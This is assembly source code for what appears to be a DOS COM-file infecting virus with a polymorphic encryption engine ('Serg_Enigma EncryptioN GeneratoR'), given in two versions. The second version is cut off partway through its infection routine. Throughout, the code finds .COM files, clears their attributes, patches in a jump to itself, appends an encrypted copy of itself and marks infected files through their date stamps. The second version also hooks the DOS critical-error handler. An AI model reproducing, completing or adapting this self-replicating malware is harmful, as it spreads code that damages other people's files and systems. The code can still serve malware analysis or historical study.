ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1289.ASM]ƒƒƒ
	.MODEL tiny
	.186
	.code 
	org 100h
start:
	jmp	sc
	db	200d dup(08h)
sc     PROC
	db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
	db      90h,90h,90h     ; \                                     YYY
	db      90h,90h,90h     ;  \                                    YYY
	db      90h,90h,90h     ;   \___DECODER                         YYY
	db      90h,90h,90h     ;   /                                   YYY
	db      90h,90h,90h     ;  /                                    YYY
	db      90h,90h,90h     ; /                                     YYY
	db      90h,90h,90h     ;/                                      YYY
	db      90h             ;-- INC {BX} {SI} {DI}                  Y
	db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
	db      90h,90h         ;-- JB  DECOD                           NY
Virn	PROC
	Mov     dx,0000h  ;--- KEY 
Virt:
;	clc
;	cld
;	Push    Cs
;	Pop     Ss
;	Pushf
;	Mov     Di,Sp
;	Mov     Bx,[Di] 
;	Lahf
;	Sub     Bx,Ax
;	Xchg    Ax,Bx
;	Xor     Al,Al
;	Sub     Ah,70h
;	Push    100h
;	Xchg    Al,Ah
;	Mov     Cx,4
;	Push    Dx
;	Mul     Cx
;	Pop     Dx
;	Sub     Di,Ax
;	Mov     Ax,[Di]
;	Sub     Ah,72h
;	Xor     Al,Al
;	Add     Dx,Ax
;	Pop     Ax
;	Pop     Ax
Virn	ENDP
        Call	opt
opt:	Pop	Bp
	Sub	Bp,offset opt
Cycl:
	Lea     si,vir+[Bp]
	Mov     cx,lng /2d
crypt:
	Xor	word ptr [Si],Dx
	Inc	Si
	Inc	Si
	loop    crypt
	Cmp	word ptr vir+[Bp],'?\'
	Jz	dr
	Inc	Dh
	Jmp	Cycl
dr:
	jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000"	;00h
atrib	db	"0"			;15h
time	db	"00"			;16h
date	db	"00"			;18h
dlina	db	"0000"			;1Ah
new_f	db	"000000000000"		;1Eh
new_j	db	"È00"
buf_j	db	"Õ ê"
;------------------------------------------------------------------------------
tabl	db	090h, 090h, 090h ;\     Nop
	db      0f6h, 017h, 090h ; \	Not b,[??]	+
	db      080h, 037h, 000h ;  \	Xor b,[??],K1	+	Key#-
	db      0c0h, 007h, 000h ;   \	Rol b,[??],K2	+	Key\_
	db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2	+	Key/
	db      0f6h, 01fh, 090h ;    /	Neg b,[??]	+
	db      080h, 007h, 000h ;   /	Add b,[??],K3	+	Key\_
	db      080h, 02fh, 000h ;  /	Sub b,[??],K3	+	Key/
;----------------------------------/
M1	db      0bbh, 022h, 000h 	;---- [ MOV BX,xxxx ]
I1	db	043h			;---- [ INC BX ]
COM	db	081h, 0fbh, 04dh, 05h   ;---- [ CMP xx,xxxx ]	+
J1	db      072h, 0e1h       	;---- [ JB xx ] e1 - 8
Gat	db	1eh
	db	06h
der	db	1fh
	db	0cbh
;-------------------------------------------------------------------------------------
Cop	db      0dh,0ah,"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v0.01 =-",0dh,0ah,"$"
;-------------------------------------------------------------------------------------
one     db      00h  ;\
	db      00h  ; \     
	db      00h  ;  \
	db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
	db      00h  ;   /
	db      00h  ;  /
	db      00h  ; /
	db      00h  ;/
;-----------------------------------------------------------------------
dir	db	00h
cody	db	0fdh,05h
seg_new db	000h,000h
b_reg	db	000h
n_com	db	000h
d_dlina	db	000h,000h

late:
	Lea	Si,buf_j+[Bp]
	Mov	Di,0100h
	Movsb
	Movsw
	Mov	byte ptr dir+[Bp],00h

	Mov	Ax,4900h
	Int	21h
	Jc	rt
	Mov	Ax,4800h
	Mov	Bx,0FFFFh
	Int	21h
	Sub	Bx,70h ;-------\
	Jc	rt
	Mov	Ax,4a00h
	Int	21h
	Mov	Ax,4800h
	Mov	Bx,6fh
	Int	21h
	Jc	Rt
	Mov	word ptr [Bp+seg_new],Ax
	Mov	Es,Ax
	Mov	Al,90h
	Xor	Di,Di
	Mov	Cx,6e0h
	Rep	Stosb
	Mov     Ah,2ch
	Int     21h
	Cmp	Dh,22h
	Jnz	drop
	Call	Mes
drop:
	Call	gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
	Lea	Si,one+[Bp]
	Mov     Ax,Dx
	Xor     Bx,Bx
	Call    rand
	Xor     Ax,1234h
	call    rand
	Mov	Ax,Word Ptr [Si]
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Mov	byte ptr [Bp]+b_reg,Al
	Push	Si
	Lea	Si,tabl+[Bp]
	Call	mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
	Pop	Si
	Mov	ax,word ptr [Si]+01
	Cmp	al,00h
	Jnz	no
	Inc	Ax
no:
	Cmp	byte ptr [Si],00h
	Jnz	mo
	Inc	byte ptr [Si]
mo:
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Inc	Al
	Mov	byte ptr [Bp+n_com],Al
	Xchg	Cx,Ax
	Mov	Ax,word ptr [Bp+seg_new]
	Mov	Es,Ax
	Xor	Ch,Ch
	Xor	Ax,Ax
	Mov	Di,0003h
	Xor	Bx,Bx
	Mov	Dx,24d
Cycle:
	Call	Comp	; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
	Inc	Si
	Add	Bx,0003h
	Sub	Dx,0003h
	Loop	Cycle
	Push	Cs
	Pop	Es
	Jmp	Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
	Cmp     byte ptr [Si],00h
	Jnz     Set_0
	Mov     Al,00d  
	Jmp     vit
Set_0:
	Cmp     byte ptr [Si],01h
	Jnz     Set_1
	Mov     Al,03d  
	Jmp     vit
Set_1:
	Cmp     byte ptr [Si],02h
	Jnz     Set_2
	Mov     Al,06d  
	Jmp     vit
Set_2:
	Cmp     byte ptr [Si],03h
	Jnz     Set_3
	Mov     Al,09d  
	Jmp     vit
Set_3:
	Cmp     byte ptr [Si],04h
	Jnz     Set_4
	Mov     Al,12d  
	Jmp     vit
Set_4:
	Cmp     byte ptr [Si],05h
	Jnz     Set_5
	Mov     Al,15h  
	Jmp     vit
Set_5:
	Cmp     byte ptr [Si],06h
	Jnz     Set_6
	Mov     Al,18d  
	Jmp     vit
Set_6:
	Cmp     byte ptr [Si],07h
	Jnz     Set_7
	Mov     Al,21d  
	Jmp     vit
Set_7:
	Cmp     byte ptr [Si],08h
	Jnz     Set_8
	Mov     Al,21d  
	Jmp     vit
Set_8:
	Cmp     byte ptr [Si],09h
	Jnz     Set_9
	Mov     Al,18d  
	Jmp     vit
Set_9:
	Cmp     byte ptr [Si],0ah
	Jnz     Set_a
	Mov     Al,15d  
	Jmp     vit
Set_a:
	Cmp     byte ptr [Si],0bh
	Jnz     Set_b
	Mov     Al,12d  
	Jmp     vit
Set_b:
	Cmp     byte ptr [Si],0ch
	Jnz     Set_c
	Mov     Al,09d  
	Jmp     vit
Set_c:
	Cmp     byte ptr [Si],0dh
	Jnz     Set_d
	Mov     Al,06d  
	Jmp     vit
Set_d:
	Cmp     byte ptr [Si],0eh
	Jnz     Set_e
	Mov     Al,03d  
	Jmp     vit
Set_e:
	Cmp     byte ptr [Si],0fh
	Jnz     Set_f
	Mov     Al,00h
	Jmp	vit
Set_f:
	Jmp	rt

set:
	Rol Ax,Cl
	Xor Ah,Ah
	Div Ch
	Mov byte ptr [Si]+[Bx],Al
	Inc Bx
	Ret
Mes:
	Push	Dx
	Mov	Ah,09h
	Lea	Dx,Cop+[Bp]
	Int	21h
	Pop	Dx
	Ret

ort:
	Movsb
	Movsw
	ret
res:
	Cmp	Al,09h
	Jnz	d1
	Mov	Al,0ch
	Ret
d1:
	Cmp	Al,0ch
	Jnz	d2
	Mov	Al,09h
	Ret
d2:
	Cmp	Al,12h
	Jnz	d3
	Mov	Al,15h
	Ret
d3:
	Cmp	Al,15h
	Jnz	d4
	Mov	Al,12h
d4:
	Ret

rand:
	push    Ax
	Mov     ch,10h
	Xor     Cl,Cl
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,04h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,08h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,0ch
	Call    set
	Pop     Ax
	Ret

vit:
	Push	Si
	Push	Di
	Push	Si
	Lea     Si,tabl+[Bp]
	Add     Si,Ax
	Add	Di,Bx
	Call    ort
	Pop     Si
	Pop	Di
	Call    res
	Push	Di
	Push	Si
	Lea	Si,tabl+[Bp]
	Add	Si,Ax
	Mov     Di,600h ;-------------------------??????????
	Add	Di,Dx
	Call    ort
	Pop     Si
	Pop	Di
	Pop	Si
	Ret
mreg:
	Cmp	Al,01h
	Jnz	q1
	Jmp	Bx_r
q1:
	Cmp	Al,02h
	Jnz	Si_r
Di_r:
	Mov	byte ptr [Si]+04h,15h
	Mov	byte ptr [Si]+07h,35h
	Mov	byte ptr [Si]+0ah,05h
	Mov	byte ptr [Si]+0dh,0dh
	Mov	byte ptr [Si]+10h,1dh
	Mov	byte ptr [Si]+13h,05h
	Mov	byte ptr [Si]+16h,2dh

	Mov	byte ptr [Si]+18h,0bfh
	Mov	byte ptr [Si]+1bh,47h
	Mov	byte ptr [Si]+1dh,0ffh
	Ret
Si_r:
	Mov	byte ptr [Si]+04h,14h
	Mov	byte ptr [Si]+07h,34h
	Mov	byte ptr [Si]+0ah,04h
	Mov	byte ptr [Si]+0dh,0ch
	Mov	byte ptr [Si]+10h,1ch
	Mov	byte ptr [Si]+13h,04h
	Mov	byte ptr [Si]+16h,2ch
	Mov	byte ptr [Si]+18h,0beh
	Mov	byte ptr [Si]+1bh,46h
	Mov	byte ptr [Si]+1dh,0feh
	Ret
Bx_r:
	Mov	byte ptr [Si]+04h,17h
	Mov	byte ptr [Si]+07h,37h
	Mov	byte ptr [Si]+0ah,07h
	Mov	byte ptr [Si]+0dh,0fh
	Mov	byte ptr [Si]+10h,1fh
	Mov	byte ptr [Si]+13h,07h
	Mov	byte ptr [Si]+16h,2fh
	Mov	byte ptr [Si]+18h,0bbh
	Mov	byte ptr [Si]+1bh,43h
	Mov	byte ptr [Si]+1dh,0fbh
	Ret

gkey:
	Push	Dx
	Mov	[Si]+8h,Dl
	Mov	[Si]+0bh,Dh
	Mov	[Si]+0eh,Dh
	Add	Dh,Dl
	Mov	[Si]+14h,Dh
	Mov	[Si]+17h,Dh
	Pop	Dx
	Ret

;**************************************************** VIRUS START *************
Virus:
	Mov     ah,1ah
	Lea     Si,vir+[Bp]
	Mov	Dx,Si
	Add	Dx,0dh
	Int     21h
	Mov	Dx,Si
	Add     dx,1h
find_f:
	Mov     ah,4eh
	Mov     cx,00h
	Int     21h  
	jmp     ok
find_n:
	Mov     ah,4fh
	Int     21h

ok:
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg:
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     fg
	jmp     rt
fg:
	dec     dx
	Mov     byte ptr [Bp]+dir,0ffh
	jmp     find_f

chk:
	Mov     cx,[Bp]+offset date
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [Bp]+offset dlina,62000d
	ja      find_n
	cmp     word ptr [Bp]+offset dlina,100h
	jb      find_n
	push    si
	Mov     di,si
	Add     di,0dh 
	Add     si,02bh
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     nam
	Mov     al,5ch
	stosb
nam:
	lodsb
	stosb
	cmp     al,00
	jnz     nam
	pop     Si
	Mov     dx,si
	Add     dx,00dh
	Mov	Cx,[Bp]+offset atrib
	Xor	Ch,Ch
	and     cx,0fffeh
	Mov     ax,4301h
	Int     21h
	Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
	Sub     ax,0003h
	Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
	Mov     al,02h               
	Mov     ah,3dh
	Int     21h                   
	jnb     ar
	jmp     rt
ar:
	Mov     bx,ax
	Mov     ax,4200h
	Mov     cx,00h
	Mov     dx,00h
	Int     21h
	Mov     ah,3fh
	Mov     cx,0003h
	Lea     dx,buf_j+[Bp]
	Int     21h
	Mov	Di,offset buf_j+[Bp]
	Cmp	Di,'ZM'
	Jnz	infect
	Mov	Ah,3eh
	Int	21h
	Jmp	find_n
infect:
	Lea	Si,virn+[Bp]
	Mov	Di,22h
	Push	offset seg_new+[Bp]
	Pop	Es
	Mov	Cx,cod2_lng
	Rep	Movsb
	Mov     ax,4200h
	Xor     cx,cx
	Xor     dx,dx
	Int     21h
	Mov     ax,4000h
	Mov     cx,0003h
	Lea	Dx,new_j+[Bp]
	Int     21h
	Mov     ah,42h
	Mov     al,02h
	Xor	Cx,Cx
	Xor	Dx,Dx
	Int     21h
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
	Mov	Ah,2ch	;	    \
	Int	21h	;	     \
	Push	Ds	;	      \
	Mov	Cx,Cod2_Lng /2d	;      \
	Mov	Si,49h		;	\
	Mov	Es:[23h],Dx ;		 \
My:				;         >---------> 1-Ô á†Ë®‰‡Æ¢™† 
	Xor	word ptr Es:[Si],Dx ;    /
	Inc	Si		    ;   /
	Inc	Si		   ;   /
	Loop	My		  ;   /
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
	Push	Bx
	Xor	Ax,Ax
	Mov	Al,[Bp]+n_com
	Mov	Bl,03h
	Mul	Bl
	Add	Ax,03h
	Mov	word ptr d_dlina+[Bp],Ax
	Lea	Si,M1+[Bp]
	Xor	Di,Di
	MovSb
	Mov	Bx,offset dlina+[Bp]
	Add	Bx,Ax
	Add	Bx,107h
	Mov	Es:[01h],Bx
	Lea	Si,I1+[Bp]
	Mov	Di,Ax
	Cld
	MovSw
	MovSb
	MovSw
	MovSw
	Add	Bx,lng
	Mov	Si,Ax
	Add	Si,03h
	Mov	Es:[Si],Bx
	Add	Si,03h
	Xor	Bx,Bx
	Sub	Bx,Ax
	Sub	Bx,4h
	Mov	byte ptr Es:[Si],Bl
;-------------------------------	
	Pop	Bx
	Lea	Si,gat+[Bp]
	Mov	Di,5fdh
	MovSb
	MovSw
	Sub	Si,0dh
	Mov	Di,600h
	MovSb
	MovSw
	Lea	Si,I1+[Bp]
	Mov	Di,61bh
	MovSw
	MovSb
	MovSw
	MovSw
	Inc	Si
	Inc	Si
	MovSw	
	Push	Bx
	Cld
	Call	dword ptr cody+[Bp]
	Pop	Bx
dry:
	Xor	Dx,Dx
	Push	Es
	Pop	Ds

	Mov     Cx,Ax
	Add	Cx,7h
	Mov     ax,4000h
	Int     21h                   
	Mov     cx,cod2_lng
	Mov	Dx,22h
	Mov     ax,4000h
	Int     21h                   
;-----------------------------------------------------------------------------

	Pop	Ds
	Mov     cx,[Bp]+offset time
	Mov     dx,[Bp]+offset date
	and     dx,65055d
	or      dx,01a0h
	Mov     ax,5701h
	Int     21h
	Mov     ah,3eh
	Int     21h

rt:
	Mov	Ah,49h
	Push	Es
	Pop	Bx
	Int	21h
	Push	Cs
	Pop	Es
	Push	100h
	Xor     Ax,Ax
	Xor	Cx,Cx
	Xor     Dx,Dx
	Xor     Bx,Bx
	Ret
sc      ENDP
lng		=	$-Sc
Cod2_lng	=	$-Virn

END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1289.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_1357.ASM]ƒƒƒ
	.MODEL tiny
	.186
	.code 
	org 100h
start:
	jmp	sc
	db	200d dup(08h)
sc     PROC
	db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
decod   db      90h,90h,90h     ;\                                      YYY
	db      90h,90h,90h     ; \                                     YYY
	db      90h,90h,90h     ;  \                                    YYY
	db      90h,90h,90h     ;   \___DECODER                         YYY
	db      90h,90h,90h     ;   /                                   YYY
	db      90h,90h,90h     ;  /                                    YYY
	db      90h,90h,90h     ; /                                     YYY
	db      90h,90h,90h     ;/                                      YYY
	db      90h             ;-- INC {BX} {SI} {DI}                  Y
	db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
	db      90h,90h         ;-- JB  DECOD                           NY
Virn	PROC
	Mov     dx,0000h  ;--- KEY 
Virt:
;	clc
;	cld
;	Push    Cs
;	Pop     Ss
;	Pushf
;	Mov     Di,Sp
;	Mov     Bx,[Di] 
;	Lahf
;	Sub     Bx,Ax
;	Xchg    Ax,Bx
;	Xor     Al,Al
;	Sub     Ah,70h
;	Push    100h
;	Xchg    Al,Ah
;	Mov     Cx,4
;	Push    Dx
;	Mul     Cx
;	Pop     Dx
;	Sub     Di,Ax
;	Mov     Ax,[Di]
;	Sub     Ah,72h
;	Xor     Al,Al
;	Add     Dx,Ax
;	Pop     Ax
;	Pop     Ax
Virn	ENDP
        Call	opt
opt:	Pop	Bp
	Sub	Bp,offset opt
Cycl:
	Lea     si,vir+[Bp]
	Mov     cx,lng /2d
crypt:
	Xor	word ptr [Si],Dx
	Inc	Si
	Sub	Dx,0deadh
	Inc	Si
	loop    crypt
;	Cmp	word ptr vir+[Bp],'?\'
;	Jz	dr
;	Inc	Dh
;	Jmp	Cycl
;dr:
	jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000"	;00h
atrib	db	"0"			;15h
time	db	"00"			;16h
date	db	"00"			;18h
dlina	db	"0000"			;1Ah
new_f	db	"000000000000"		;1Eh
new_j	db	"È00"
buf_j	db	"Õ ê"
;------------------------------------------------------------------------------
tabl	db	052h, 0fch, 05ah ;\     Nop
	db      0f6h, 017h, 090h ; \	Not b,[??]	+
	db      080h, 037h, 000h ;  \	Xor b,[??],K1	+	Key#-
	db      0c0h, 007h, 000h ;   \	Rol b,[??],K2	+	Key\_
	db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2	+	Key/
	db      0f6h, 01fh, 090h ;    /	Neg b,[??]	+
	db      080h, 007h, 000h ;   /	Add b,[??],K3	+	Key\_
	db      080h, 02fh, 000h ;  /	Sub b,[??],K3	+	Key/
;----------------------------------/
M1	db      0bbh, 022h, 000h 	;---- [ MOV BX,xxxx ]
I1	db	043h			;---- [ INC BX ]
COM	db	081h, 0fbh, 07bh, 05h   ;---- [ CMP xx,xxxx ]	+
J1	db      072h, 0e1h       	;---- [ JB xx ] e1 - 8
Gat	db	1eh
	db	06h
der	db	1fh
	db	0cbh
;-------------------------------------------------------------------------------------
Cop	db      0dh,0ah,"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v0.01 =-",0dh,0ah,"$"
;-------------------------------------------------------------------------------------
one     db      00h  ;\
	db      00h  ; \     
	db      00h  ;  \
	db      00h  ;   \___{ äÆ¨°®≠†Ê®Ô ™Æ¨¨†≠§ §´Ô ß†/‡†ßË®‰‡Æ¢È®™†
	db      00h  ;   /
	db      00h  ;  /
	db      00h  ; /
	db      00h  ;/
;-----------------------------------------------------------------------
dir	db	00h
cody	db	0fdh,05h
seg_new dd	?
b_reg	db	?
n_com	db	?
d_dlina	dd	?
vec24	dd	?

late:
	Lea	Si,buf_j+[Bp]
	Mov	Di,0100h
	Movsb
	Movsw
	Mov	byte ptr dir+[Bp],00h
	Push	Es
	Call	Set_Int_24
	Pop	Es
	Mov	Ax,4900h
	Int	21h
	Jc	rt
	Mov	Ax,4800h
	Mov	Bx,0FFFFh
	Int	21h
	Sub	Bx,70h ;-------\
	Jc	rt
	Mov	Ax,4a00h
	Int	21h
	Mov	Ax,4800h
	Mov	Bx,6fh
	Int	21h
	Jc	Rt
	Mov	word ptr [Bp+seg_new],Ax
	Mov	Es,Ax
	Mov	Al,90h
	Xor	Di,Di
	Mov	Cx,6e0h
	Rep	Stosb
	Mov     Ah,2ch
	Int     21h
	Cmp	Dh,22h
	Jnz	drop
	Call	Mes
drop:
	Call	gkey  ;è‡ÆÊ•§„‡† £•≠•‡†Ê®® 3-•Â ™´ÓÁ•© ® ß†≠•·•≠®Ô ®Â ¢ ‚†°´®Ê„
	Lea	Si,one+[Bp]
	Mov     Ax,Dx
	Xor     Bx,Bx
	Call    rand
	Xor     Ax,1234h
	call    rand
	Mov	Ax,Word Ptr [Si]
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Mov	byte ptr [Bp]+b_reg,Al
	Push	Si
	Lea	Si,tabl+[Bp]
	Call	mreg    ; è‡ÆÊ•§„‡† ®Ì¨•≠•≠®Ô °†ßÆ¢ÎÂ ‡•£®·‚‡Æ¢ ¢ ‚†°´®Ê•
	Pop	Si
	Mov	ax,word ptr [Si]+01
	Cmp	al,00h
	Jnz	no
	Inc	Ax
no:
	Cmp	byte ptr [Si],00h
	Jnz	mo
	Inc	byte ptr [Si]
mo:
	Xor	Ah,Ah
	Mov	Bl,02h
	Div	Bl
	Xor	Ah,Ah
	Inc	Al
	Mov	byte ptr [Bp+n_com],Al
	Xchg	Cx,Ax
	Mov	Ax,word ptr [Bp+seg_new]
	Mov	Es,Ax
	Xor	Ch,Ch
	Xor	Ax,Ax
	Mov	Di,0003h
	Xor	Bx,Bx
	Mov	Dx,24d
Cycle:
	Call	Comp	; É•≠•‡†Ê®Ô ØÆ·´•§Æ¢†‚•´Ï≠Æ·‚® ™Æ¨†≠§
	Inc	Si
	Add	Bx,0003h
	Sub	Dx,0003h
	Loop	Cycle
	Push	Cs
	Pop	Es
	Jmp	Virus
;------ èÆ§Ø‡Æ£‡†¨¨Î ----------------------------------------------------------
Comp:
	Cmp     byte ptr [Si],00h
	Jnz     Set_0
	Mov     Al,00d  
	Jmp     vit
Set_0:
	Cmp     byte ptr [Si],01h
	Jnz     Set_1
	Mov     Al,03d  
	Jmp     vit
Set_1:
	Cmp     byte ptr [Si],02h
	Jnz     Set_2
	Mov     Al,06d  
	Jmp     vit
Set_2:
	Cmp     byte ptr [Si],03h
	Jnz     Set_3
	Mov     Al,09d  
	Jmp     vit
Set_3:
	Cmp     byte ptr [Si],04h
	Jnz     Set_4
	Mov     Al,12d  
	Jmp     vit
Set_4:
	Cmp     byte ptr [Si],05h
	Jnz     Set_5
	Mov     Al,15h  
	Jmp     vit
Set_5:
	Cmp     byte ptr [Si],06h
	Jnz     Set_6
	Mov     Al,18d  
	Jmp     vit
Set_6:
	Cmp     byte ptr [Si],07h
	Jnz     Set_7
	Mov     Al,21d  
	Jmp     vit
Set_7:
	Cmp     byte ptr [Si],08h
	Jnz     Set_8
	Mov     Al,21d  
	Jmp     vit
Set_8:
	Cmp     byte ptr [Si],09h
	Jnz     Set_9
	Mov     Al,18d  
	Jmp     vit
Set_9:
	Cmp     byte ptr [Si],0ah
	Jnz     Set_a
	Mov     Al,15d  
	Jmp     vit
Set_a:
	Cmp     byte ptr [Si],0bh
	Jnz     Set_b
	Mov     Al,12d  
	Jmp     vit
Set_b:
	Cmp     byte ptr [Si],0ch
	Jnz     Set_c
	Mov     Al,09d  
	Jmp     vit
Set_c:
	Cmp     byte ptr [Si],0dh
	Jnz     Set_d
	Mov     Al,06d  
	Jmp     vit
Set_d:
	Cmp     byte ptr [Si],0eh
	Jnz     Set_e
	Mov     Al,03d  
	Jmp     vit
Set_e:
	Cmp     byte ptr [Si],0fh
	Jnz     Set_f
	Mov     Al,00h
	Jmp	vit
Set_f:
	Jmp	rt

set:
	Rol Ax,Cl
	Xor Ah,Ah
	Div Ch
	Mov byte ptr [Si]+[Bx],Al
	Inc Bx
	Ret
Mes:
	Push	Dx
	Mov	Ah,09h
	Lea	Dx,Cop+[Bp]
	Int	21h
	Pop	Dx
	Ret

ort:
	Movsb
	Movsw
	ret
res:
	Cmp	Al,09h
	Jnz	d1
	Mov	Al,0ch
	Ret
d1:
	Cmp	Al,0ch
	Jnz	d2
	Mov	Al,09h
	Ret
d2:
	Cmp	Al,12h
	Jnz	d3
	Mov	Al,15h
	Ret
d3:
	Cmp	Al,15h
	Jnz	d4
	Mov	Al,12h
d4:
	Ret

rand:
	push    Ax
	Mov     ch,10h
	Xor     Cl,Cl
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,04h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,08h
	Call    set
	Pop     Ax
	Push    Ax
	Mov     Cl,0ch
	Call    set
	Pop     Ax
	Ret

R_Vec24	       PROC
		Push	word ptr Vec24+[Bp]
		Pop	Ds
		Mov	Dx,word ptr Vec24+[Bp]+2
		Mov	Ax,2524h
		Int	21h
		Ret
R_Vec24	       ENDP

Set_Int_24:	Push	Ds
		Push	Bx
		Push	Dx
		Mov	Ax,3524h
		Int	21h
		Mov	word ptr Vec24+[Bp]+2,Bx
		Mov	word ptr Vec24+[Bp],Es
		Push	Cs
		Pop	Ds
		Mov	Ax,2524h
		Lea	Dx,intr24+[Bp]
		Int	21h
		Pop	Dx
		Pop	Bx
		Pop	Ds
		Ret

;Intr21	       PROC
;	db	09ah
;	vector	dd	?
;		ret
;Intr21	       ENDP

Intr24:
	Mov	Al,3h
	Iret

vit:
	Push	Si
	Push	Di
	Push	Si
	Lea     Si,tabl+[Bp]
	Add     Si,Ax
	Add	Di,Bx
	Call    ort
	Pop     Si
	Pop	Di
	Call    res
	Push	Di
	Push	Si
	Lea	Si,tabl+[Bp]
	Add	Si,Ax
	Mov     Di,600h ;-------------------------??????????
	Add	Di,Dx
	Call    ort
	Pop     Si
	Pop	Di
	Pop	Si
	Ret
mreg:
	Cmp	Al,01h
	Jnz	q1
	Jmp	Bx_r
q1:
	Cmp	Al,02h
	Jnz	Si_r
Di_r:
	Mov	byte ptr [Si]+04h,15h
	Mov	byte ptr [Si]+07h,35h
	Mov	byte ptr [Si]+0ah,05h
	Mov	byte ptr [Si]+0dh,0dh
	Mov	byte ptr [Si]+10h,1dh
	Mov	byte ptr [Si]+13h,05h
	Mov	byte ptr [Si]+16h,2dh
	Mov	byte ptr [Si]+18h,0bfh
	Mov	byte ptr [Si]+1bh,47h
	Mov	byte ptr [Si]+1dh,0ffh
	Ret
Si_r:
	Mov	byte ptr [Si]+04h,14h
	Mov	byte ptr [Si]+07h,34h
	Mov	byte ptr [Si]+0ah,04h
	Mov	byte ptr [Si]+0dh,0ch
	Mov	byte ptr [Si]+10h,1ch
	Mov	byte ptr [Si]+13h,04h
	Mov	byte ptr [Si]+16h,2ch
	Mov	byte ptr [Si]+18h,0beh
	Mov	byte ptr [Si]+1bh,46h
	Mov	byte ptr [Si]+1dh,0feh
	Ret
Bx_r:
	Mov	byte ptr [Si]+04h,17h
	Mov	byte ptr [Si]+07h,37h
	Mov	byte ptr [Si]+0ah,07h
	Mov	byte ptr [Si]+0dh,0fh
	Mov	byte ptr [Si]+10h,1fh
	Mov	byte ptr [Si]+13h,07h
	Mov	byte ptr [Si]+16h,2fh
	Mov	byte ptr [Si]+18h,0bbh
	Mov	byte ptr [Si]+1bh,43h
	Mov	byte ptr [Si]+1dh,0fbh
	Ret

gkey:
	Push	Dx
	Mov	[Si]+8h,Dl
	Mov	[Si]+0bh,Dh
	Mov	[Si]+0eh,Dh
	Add	Dh,Dl
	Mov	[Si]+14h,Dh
	Mov	[Si]+17h,Dh
	Pop	Dx
	Ret

;**************************************************** VIRUS START *************
Virus:
	Mov     ah,1ah
	Lea     Si,vir+[Bp]
	Mov	Dx,Si
	Add	Dx,0dh
	Int     21h
	Mov	Dx,Si
	Add     dx,1h
find_f:
	Mov     ah,4eh
	Mov     cx,00h
	Int     21h  
	jmp     ok
find_n:
	Mov     ah,4fh
	Int     21h

ok:
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg:
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     fg
	jmp     rt
fg:
	dec     dx
	Mov     byte ptr [Bp]+dir,0ffh
	jmp     find_f

chk:
	Mov     cx,[Bp]+offset date
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [Bp]+offset dlina,62000d
	ja      find_n
	cmp     word ptr [Bp]+offset dlina,100h
	jb      find_n
	push    si
	Mov     di,si
	Add     di,0dh 
	Add     si,02bh
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     nam
	Mov     al,5ch
	stosb
nam:
	lodsb
	stosb
	cmp     al,00
	jnz     nam
	pop     Si
	Mov     dx,si
	Add     dx,00dh
	Mov	Cx,[Bp]+offset atrib
	Xor	Ch,Ch
	and     cx,0fffeh
	Mov     ax,4301h
	Int     21h
	Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
	Sub     ax,0003h
	Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
